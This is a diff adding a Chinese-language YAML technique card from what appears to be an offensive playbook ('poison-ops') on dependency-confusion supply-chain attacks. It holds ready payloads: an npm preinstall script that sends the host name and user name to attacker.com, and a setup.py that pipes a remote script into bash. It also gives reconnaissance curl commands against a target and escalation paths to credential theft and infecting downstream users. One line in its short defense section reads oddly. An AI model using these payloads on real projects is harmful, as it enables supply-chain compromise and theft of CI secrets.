@@ -1,0 +1,97 @@
+# 技术卡片: CI/CD 依赖混淆攻击
+# 分类: cicd-poisoning / supply-chain / dependency-confusion
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: poison-ops P4 / Alex Birsan (Dependency Confusion)
+
+id: "cicd-dependency-confusion"
+name: "CI/CD 依赖混淆 — 供应链投毒"
+category: "cicd-poisoning"
+subcategory: "supply-chain"
+severity: "critical"
+
+description: |
+  当企业使用私有包（如 @company/internal-lib）且 CI/CD 未配置
+  私有 registry 优先时，攻击者向公共 registry 发布同名高版本包。
+  构建系统拉取公共包而非内部包，触发 install 脚本 → RCE。
+
+trigger_signals:
+  - "package.json/requirements.txt 中存在 @company/ 或内部包名"
+  - "JS source map 暴露内部包名"
+  - "CI/CD 构建日志显示 npm/pip install"
+  - ".npmrc 未配置私有 registry scope"
+  - "无 package-lock.json 或未锁定版本"
+
+payloads:
+  - technique: "npm 依赖混淆 — preinstall 脚本"
+    payload: |
+      {
+        "name": "target-internal-pkg",
+        "version": "99.0.0",
+        "scripts": {
+          "preinstall": "curl -s https://attacker.com/collect -d \"host=$(hostname)&user=$(whoami)\""
+        }
+      }
+    note: "发布到 npm registry，版本号远高于内部包"
+
+  - technique: "PyPI 依赖混淆 — setup.py 投毒"
+    payload: |
+      from setuptools import setup
+      import os
+      os.system("curl -s https://attacker.com/pwn | bash")
+      setup(name="target-internal-lib", version="99.0.0")
+    note: "pip install 时自动执行 setup.py"
+
+  - technique: "内部包名探测 — JS source map"
+    payload: "curl 'https://target.com/static/js/app.js.map' | jq '.sources'"
+    note: "source map 暴露内部包路径和名称"
+
+  - technique: "内部包名探测 — package.json 泄露"
+    payload: "curl 'https://target.com/package.json'"
+    note: "直接暴露所有依赖包名"
+
+  - technique: "Maven/Gradle 依赖混淆"
+    payload: "在公共 Maven Central 发布 groupId:artifactId 同名高版本包"
+    note: "Gradle 默认优先拉取高版本"
+
+success_indicators:
+  - "构建系统从公共 registry 拉取了恶意包"
+  - "preinstall/postinstall 脚本在 CI 环境执行"
+  - "收到 CI/CD 服务器的 DNS/HTTP 回连"
+  - "获取到 CI/CD 环境变量或凭据"
+
+prerequisites:
+  - "目标使用私有包名 + 公共 registry 混合"
+  - "未配置 scope 级别的 registry 指向"
+  - "CI/CD 在构建时执行 install 脚本"
+  - "能向公共 registry 发布包（需验证环境）"
+
+upgrade_paths:
+  - "CI/CD 凭据窃取 → 代码仓库写入"
+  - "构建环境 RCE → 制品投毒"
+  - "发布含后门的新版本 → 下游用户感染"
+
+defense:
+  - "配置 scope 级别的私有 registry（npm: @company:registry=...）"
+  - "锁定依赖版本（package-lock.json / Pipfile.lock）"
+  - "CI/CD 不使用 --ignore-scripts 但要审计"
+  - "私有包名前缀保留/注册在公共 registry"
+
+tools:
+  - "npm / pip / mvn"
+  - "gitleaks"
+  - "trufflehog"
+  - "curl (探测)"
+
+confidence: "high"
+limitations:
+  - "需要向公共 registry 发布包（不可逆副作用）"
+  - "验证时必须使用隔离测试环境"
+  - "部分 registry 会阻止 typo-squatting"
+  - "scope 包需要付费 npm 账号"
+
+sources:
+  - agent: "blackmule"
+    date: "2026-07-23"
+  - ref: "Alex Birsan: Dependency Confusion (2021)"
+  - ref: "CWE-427: Uncontrolled Search Path Element"
